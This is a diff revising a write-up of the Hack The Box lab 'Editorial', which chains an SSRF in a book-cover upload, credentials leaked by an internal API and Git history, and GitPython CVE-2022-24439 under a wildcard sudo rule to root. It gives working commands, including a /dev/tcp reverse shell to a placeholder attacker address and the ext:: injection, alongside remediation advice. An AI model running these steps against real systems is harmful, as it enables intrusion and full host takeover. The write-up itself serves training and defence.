@@ -1,5 +1,5 @@
 ---
-title: "SSRF to GitPython Privilege Escalation"
+title: "Editorial — SSRF and Git History Credential Leak to GitPython Command Injection"
 description: "SSRF in a book-cover upload exposes an internal API and development credentials; Git history reveals production credentials, and a sudo-permitted GitPython script vulnerable to CVE-2022-24439 yields root."
 type: case-study
 platform: Hack The Box
@@ -11,21 +11,48 @@ tags:
   - ssrf
   - gitpython
   - credential-leak
+objective: "Chain an unauthenticated SSRF, leaked credentials, and a sudo-permitted GitPython script to root."
+tools:
+  - rustscan
+  - ffuf
+  - curl
+  - sshpass
+  - git
+  - netcat
+  - python3
+skill: "SSRF exploitation and credential-driven lateral movement to GitPython command injection"
+outcome: "Root command execution via GitPython CVE-2022-24439 through a sudo-permitted script"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Linux (Ubuntu 22.04); nginx publishing platform |
+| Starting position | Unauthenticated network access |
+| Objective | Chain SSRF, credential leakage, and a vulnerable GitPython sudo script to root |
+| Outcome | Root command execution via CVE-2022-24439 as the production user |
 
 ## Summary
 
-This Linux lab (Ubuntu 22.04) contains an SSRF vulnerability in a publishing platform's book cover upload feature that exposes an internal API service. The API leaks credentials for the `<DEVELOPMENT_USER>` user, enabling SSH access. A local Git repository in that user's home directory exposes production credentials via commit history. Privilege escalation exploits CVE-2022-24439 in GitPython through a sudo rule that permits the `<PRODUCTION_USER>` user to execute a vulnerable Python script as root.
+Editorial is an Easy-rated Hack The Box Linux lab. A book-cover upload feature on a publishing platform fetches user-supplied URLs server-side, and the resulting SSRF reaches an internal API that returns development-user credentials; SSH access with those credentials then exposes a Git repository whose history leaks production credentials, and a sudo rule lets the production user run a GitPython script as root that is vulnerable to CVE-2022-24439. Credential values, target and attacker addresses, hostnames, and internal paths are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **SSRF via cover upload → internal API credential leak → SSH as development user → Git history production credential leak → SSH as production user → GitPython `ext::` command injection (CVE-2022-24439) → root**
 
 ## Context and Objective
 
-The target runs nginx on port 80 and SSH on port 22. The web application at `http://<TARGET_HOST>` provides a book publishing platform with a cover image upload feature. The objective is to identify and exploit the SSRF vector, enumerate internal services, extract credentials, and escalate to root.
+- **Target:** Linux (Ubuntu 22.04) hosting an nginx publishing platform.
+- **Exposed services:** SSH (22) and HTTP (80).
+- **Starting position:** unauthenticated network access.
+- **Objective:** identify and exploit the SSRF vector, enumerate internal services, recover credentials, and escalate to root.
+- **Constraints:** activity was confined to the Hack The Box lab environment. The platform is served under a hostname-based vhost, so `<TARGET_HOST>` is resolved to the target address for the web requests below.
 
 ## Approach and Evidence
 
-### Port Scanning and Service Discovery
+### 1. Service Enumeration
 
-The target exposes SSH and HTTP:
+Observation: the target exposes SSH and HTTP.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -sC -sV -Pn -oN nmap/target-TCP
@@ -36,11 +63,13 @@ rustscan -a <TARGET_IP> --ulimit 5000 -- -sC -sV -Pn -oN nmap/target-TCP
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 ```
 
-The web server redirects to `http://<TARGET_HOST>`. The `<UPLOAD_ENDPOINT>` endpoint accepts a book cover image URL and performs server-side fetching.
+Significance: only two services are exposed, and the HTTP vhost is the sole interaction point for the upload feature.
 
-### SSRF via Book Cover Upload
+Result: SSH and nginx are identified, and the publishing platform is reachable over HTTP.
 
-The `<UPLOAD_ENDPOINT>` endpoint accepts a user-supplied `bookurl` parameter and fetches it server-side. Pointing this at the internal network reveals an API service on port 5000:
+### 2. SSRF via Book Cover Upload
+
+Observation: the cover-upload action accepts a user-supplied `bookurl` and fetches it server-side, so pointing it at loopback ports probes the internal interface through the SSRF.
 
 ```bash
 ffuf -u http://<TARGET_HOST><UPLOAD_ENDPOINT> -request ssrf.req -w <(seq 0 65535) -ac
@@ -50,9 +79,17 @@ ffuf -u http://<TARGET_HOST><UPLOAD_ENDPOINT> -request ssrf.req -w <(seq 0 65535
 5000  [Status: 200]
 ```
 
-### Internal API Enumeration
+Significance: the server-side fetch reaches loopback, so services bound to the internal interface are exposed through the upload feature.
 
-The SSRF response from the internal service at `http://<INTERNAL_API_HOST>:5000` exposes metadata endpoints:
+Result: an internal API service answers on port 5000.
+
+### 3. Internal API Enumeration
+
+Observation: the internal service exposes metadata endpoints, and its JSON response is retrievable through the SSRF via the upload feature's static output path.
+
+```bash
+curl http://<TARGET_HOST>/static/uploads/<UPLOAD_ID>.json -s | jq .
+```
 
 ```json
 {
@@ -66,9 +103,13 @@ The SSRF response from the internal service at `http://<INTERNAL_API_HOST>:5000`
 }
 ```
 
-### Credential Leak via Internal API
+Significance: the API advertises its own routes, so the credential-bearing authors endpoint is discoverable without further guessing.
 
-The `<AUTHORS_ENDPOINT>` endpoint returns onboarding credentials. Using the SSRF to target this endpoint:
+Result: metadata endpoints are enumerated and the onboarding (authors) endpoint is identified.
+
+### 4. Credential Leak via Internal API
+
+Observation: the authors endpoint returns onboarding credentials.
 
 ```bash
 curl -X POST http://<TARGET_HOST><UPLOAD_ENDPOINT> \
@@ -76,46 +117,71 @@ curl -X POST http://<TARGET_HOST><UPLOAD_ENDPOINT> \
   -F "bookfile=@/dev/null;filename="
 ```
 
-The returned JSON contains plaintext credentials for the `<DEVELOPMENT_USER>` user.
+```text
+Your login credentials for our internal forum and authors site are:
+Username: <DEVELOPMENT_USER>
+Password: <DEVELOPMENT_USER_PASSWORD>
+Please be sure to change your password as soon as possible for security purposes.
+```
 
-### SSH Access as Development User
+Significance: an internal-only endpoint returns plaintext credentials, so the SSRF alone yields usable account data.
 
-The leaked credentials grant SSH access:
+Result: development-user credentials are recovered through the SSRF.
+
+### 5. SSH Access as Development User
+
+Observation: the recovered credentials fit the exposed SSH service.
 
 ```bash
 sshpass -p '<DEVELOPMENT_USER_PASSWORD>' ssh <DEVELOPMENT_USER>@<TARGET_HOST>
 ```
 
-The `<USER_RESULT>` is available.
+The source records this login and the later production-user login as successful without captured session output.
 
-### Git History Credential Leak
+Significance: authenticated access as the development user provides the home directory that holds the Git repository used in the next stage.
 
-A Git repository exists under the user's home directory at `<DEVELOPMENT_HOME>/<REPOSITORY_DIRECTORY>`. Inspecting the commit history reveals production credentials in a reverted change:
+Result: a development-user shell is obtained.
+
+### 6. Git History Credential Leak
+
+Observation: a Git repository under the development user's home directory contains a reverted production configuration change.
 
 ```bash
 cd <DEVELOPMENT_HOME>/<REPOSITORY_DIRECTORY> && git log
 ```
 
 ```text
-commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
-    change(api): switching production to development configuration
+commit <COMMIT_HASH>
+    change(api): downgrading prod to dev
 ```
 
 ```bash
-git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+git show <COMMIT_HASH>
 ```
 
-The diff shows production credentials that were downgraded in a previous commit, exposing the `<PRODUCTION_USER>` user's password.
+```text
+-    const password = '<PRODUCTION_USER_PASSWORD>';
+```
 
-### Lateral Movement to Production User
+Significance: secrets removed from the working tree persist in history, so the reverted change still exposes the production password.
+
+Result: production-user credentials are recovered from commit history.
+
+### 7. Lateral Movement to Production User
+
+Observation: the production credentials fit the same SSH service.
 
 ```bash
 sshpass -p '<PRODUCTION_USER_PASSWORD>' ssh <PRODUCTION_USER>@<TARGET_HOST>
 ```
 
-### Privilege Escalation via CVE-2022-24439
+Significance: the production account holds the sudo rule that permits root execution, making it the pivot for privilege escalation.
 
-Sudo enumeration reveals that `<PRODUCTION_USER>` may run a Python script as root:
+Result: a production-user shell is obtained.
+
+### 8. Privilege Escalation via CVE-2022-24439
+
+Observation: the production user may run a Python script as root.
 
 ```bash
 sudo -l
@@ -126,7 +192,7 @@ User <PRODUCTION_USER> may run the following commands on <TARGET_HOST>:
     (root) /usr/bin/python3 <PRIVILEGED_SCRIPT_PATH> *
 ```
 
-The privileged script uses GitPython's `clone_from` method with the `-c protocol.ext.allow=always` multi-option:
+The script clones a user-supplied URL with GitPython and enables the `ext::` transport:
 
 ```python
 import os, sys
@@ -137,11 +203,11 @@ r = Repo.init('', bare=True)
 r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
 ```
 
-GitPython versions before 3.1.30 are vulnerable to CVE-2022-24439. The `ext::` protocol prefix permits arbitrary command execution:
+Action: GitPython before 3.1.30 is vulnerable to CVE-2022-24439 — the `ext::` transport runs shell commands, and the wildcard sudo rule permits an arbitrary clone URL.
 
 ```bash
-echo "bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1" > /tmp/revshell.sh
-nc -nlvp 9001
+echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTEN_PORT> 0>&1" > /tmp/revshell.sh
+nc -nlvp <LISTEN_PORT>
 ```
 
 ```bash
@@ -152,25 +218,33 @@ sudo /usr/bin/python3 <PRIVILEGED_SCRIPT_PATH> 'ext::sh -c bash% /tmp/revshell.s
 root@<TARGET_HOST>:<PRIVILEGED_WORKING_DIRECTORY>#
 ```
 
-`<PRIVILEGED_RESULT>` is available.
+Significance: the wildcard argument combined with the enabled `ext::` protocol turns a narrow-looking sudo rule into arbitrary root command execution.
+
+Result: a root shell is returned on the callback, confirming the privilege change.
 
 ## Challenges and Decisions
 
-No documented obstacles or failed attempts in the source notes. The exploitation path was linear: SSRF → internal API credential leak → Git history credential leak → CVE-2022-24439 privilege escalation.
+The source documents no failed attempts or tradeoffs; the exploitation path was linear from SSRF to root, with each stage handing the next one a usable credential or execution context.
 
 ## Outcome
 
-The machine was fully compromised through three distinct credential-leak vectors: an internal API accessible via SSRF, Git commit history exposing production credentials, and a vulnerable GitPython script with overly permissive sudo rules. All three stages were technically independent, meaning any one of them would have required remediation to prevent full compromise.
+The evidence establishes root command execution on the target through a sudo-permitted GitPython script vulnerable to CVE-2022-24439, with the privilege change confirmed by the returned root shell prompt.
 
 ## Lessons and Recommendations
 
-- **SSRF through image upload is a classic entry point.** The ability to read responses makes it especially dangerous because it enables internal API enumeration and data exfiltration.
-- **Internal metadata APIs often leak credentials.** The `<AUTHORS_ENDPOINT>` endpoint was never intended to be reached externally but was fully accessible via SSRF. Internal services should not trust the network boundary.
-- **Git history is a persistent credential store.** The production password was removed from the current working tree but survived in the commit history. Use `git filter-branch` or BFG Repo-Cleaner to purge secrets; better yet, use environment variables or secrets managers.
-- **GitPython's `ext::` protocol combined with `-c protocol.ext.allow=always` is a well-documented command injection vector.** Sudo rules that allow arbitrary arguments to GitPython scripts should be avoided. Upgrade GitPython to 3.1.30 or later.
-- **Restrict sudo rules to specific arguments.** The wildcard `*` in the sudo rule permitted injection via the Git URL argument.
+1. **Server-side request forgery in the upload feature.** The cover-upload action fetched any user-supplied URL, exposing loopback-only services. *Recommendation:* validate and allowlist outbound fetch destinations, block loopback and internal ranges, and avoid returning fetched response bodies to the requester. *Detection:* alert on requests whose `bookurl` targets internal addresses.
+2. **Internal API returned plaintext credentials.** The authors endpoint disclosed onboarding credentials to any caller reaching it. *Recommendation:* never return reusable credentials from APIs, and require authentication even for internal-only endpoints.
+3. **Secrets persisted in Git history.** The production password was removed from the working tree but survived in a reverted commit. *Recommendation:* purge secrets from history and treat any exposed value as compromised and rotate it; add secret scanning to the pipeline and store secrets in a manager rather than source.
+4. **GitPython `ext::` transport reachable through a wildcard sudo rule.** Enabling `-c protocol.ext.allow=always` allowed command execution, and the `*` argument let the production user choose the clone URL. *Recommendation:* upgrade GitPython to 3.1.30 or later, restrict the sudo rule to fixed arguments rather than a wildcard, and avoid enabling the `ext::` protocol.
 
 ## References
 
-- Hack The Box retired Linux machine — [Editorial](https://app.hackthebox.com/machines/Editorial)
-- CVE-2022-24439: GitPython command injection via `ext::` protocol
+- [Hack The Box — Editorial](https://app.hackthebox.com/machines/Editorial) (retired Linux machine)
+- [NVD — CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) (GitPython remote code execution via the `ext::` protocol)
+- [GitHub Advisory — GHSA-hcpj-qp55-gfph](https://github.com/advisories/GHSA-hcpj-qp55-gfph) (GitPython remote code execution via the `ext::` protocol; CVE-2022-24439)
+- [GitPython 3.1.30 release](https://github.com/gitpython-developers/GitPython/releases/tag/3.1.30) (fix version for CVE-2022-24439)
+- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
+- [ffuf](https://github.com/ffuf/ffuf) (content and parameter fuzzing, including the internal port scan)
+- [curl — command-line tool and library](https://curl.se/docs/manpage.html)
+- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
+- [Git — Reference](https://git-scm.com/docs) (commit history inspection)
